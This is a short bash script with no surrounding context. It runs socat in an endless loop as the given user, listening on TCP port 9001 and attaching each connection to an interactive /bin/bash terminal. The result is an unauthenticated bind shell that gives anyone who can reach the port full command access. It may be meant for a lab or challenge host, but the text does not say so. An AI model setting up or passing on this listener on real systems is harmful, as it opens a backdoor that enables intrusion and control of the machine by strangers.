#!/bin/bash

while [ true ]; do
	su -l $USER -c "socat -dd TCP4-LISTEN:9001,fork,reuseaddr EXEC:'/bin/bash',pty,echo=0,rawer,iexten=0"
done;
